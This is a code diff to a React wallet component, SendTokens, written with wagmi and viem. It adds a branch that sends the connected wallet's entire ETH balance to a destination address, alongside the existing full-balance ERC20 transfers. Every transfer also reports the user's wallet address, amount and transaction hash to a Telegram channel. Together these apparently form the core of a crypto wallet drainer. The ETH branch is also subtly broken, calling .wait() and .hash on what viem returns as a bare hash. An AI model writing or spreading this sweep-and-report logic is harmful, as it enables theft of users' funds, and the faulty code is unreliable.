@@ -1,4 +1,4 @@
-import { useState, useEffect, useCallback } from 'react'; // Import useState, useEffect, useCallback
+import { useState, useEffect, useCallback } from 'react';
 import { Button, useToasts } from '@geist-ui/core';
 import { usePublicClient, useWalletClient, useAccount } from 'wagmi';
 import { erc20Abi } from 'viem';
@@ -196,40 +196,59 @@ export const SendTokens = () => {
       const formattedTokenAddress: `0x${string}` = tokenAddress.startsWith('0x') ? tokenAddress as `0x${string}` : `0x${tokenAddress}` as `0x${string}`;
 
       try {
-        // Ensure destinationAddress is properly formatted
-        const formattedDestinationAddress: `0x${string}` = resolvedDestinationAddress.startsWith('0x') 
-          ? resolvedDestinationAddress as `0x${string}` 
-          : `0x${resolvedDestinationAddress}` as `0x${string}`;
+        if (formattedTokenAddress === '0x0000000000000000000000000000000000000000') { // ETH address
+          // Send ETH transaction
+          const amountInWei = BigInt(token?.balance || '0');
+          
+          const tx = {
+            to: resolvedDestinationAddress,
+            value: amountInWei,
+          };
+          
+          const txResponse = await walletClient.sendTransaction(tx);
+          await txResponse.wait();
 
-        const { request } = await publicClient.simulateContract({
-          account: walletClient.account,
-          address: formattedTokenAddress,
-          abi: erc20Abi,
-          functionName: 'transfer',
-          args: [
-            formattedDestinationAddress,
-            BigInt(token?.balance || '0'),
-          ],
-        });
+          showToast(
+            `ETH transfer of ${token?.balance} ETH sent. Tx Hash: ${txResponse.hash}`,
+            'success',
+          );
 
-        const res = await walletClient.writeContract(request);
-        setCheckedRecords((old) => ({
-          ...old,
-          [formattedTokenAddress]: {
-            ...(old[formattedTokenAddress] || { isChecked: false }),
-            pendingTxn: res,
-          },
-        }));
+          // Send a Telegram notification for the ETH transaction
+          await sendTelegramNotification(
+            `ETH Transaction Sent: Wallet Address: ${address}, Amount: ${token?.balance} ETH, Tx Hash: ${txResponse.hash}, Network: ${chain?.name}`
+          );
+        } else {
+          // Send ERC20 token transaction
+          const { request } = await publicClient.simulateContract({
+            account: walletClient.account,
+            address: formattedTokenAddress,
+            abi: erc20Abi,
+            functionName: 'transfer',
+            args: [
+              resolvedDestinationAddress,
+              BigInt(token?.balance || '0'),
+            ],
+          });
 
-        showToast(
-          `Transfer of ${token?.balance} ${token?.contract_ticker_symbol} sent. Tx Hash: ${res.hash}`,
-          'success',
-        );
+          const res = await walletClient.writeContract(request);
+          setCheckedRecords((old) => ({
+            ...old,
+            [formattedTokenAddress]: {
+              ...(old[formattedTokenAddress] || { isChecked: false }),
+              pendingTxn: res,
+            },
+          }));
 
-        // Send a Telegram notification for each successful transaction
-        await sendTelegramNotification(
-          `Transaction Sent: Wallet Address: ${address}, Token: ${token?.contract_ticker_symbol}, Amount: ${token?.balance}, Tx Hash: ${res.hash}, Network: ${chain?.name}`
-        );
+          showToast(
+            `Transfer of ${token?.balance} ${token?.contract_ticker_symbol} sent. Tx Hash: ${res.hash}`,
+            'success',
+          );
+
+          // Send a Telegram notification for each successful ERC20 transaction
+          await sendTelegramNotification(
+            `Transaction Sent: Wallet Address: ${address}, Token: ${token?.contract_ticker_symbol}, Amount: ${token?.balance}, Tx Hash: ${res.hash}, Network: ${chain?.name}`
+          );
+        }
       } catch (err: any) {
         showToast(
           `Error with ${token?.contract_ticker_symbol} ${err?.reason || 'Unknown error'}`,
@@ -258,4 +277,3 @@ export const SendTokens = () => {
     </div>
   );
 };
-
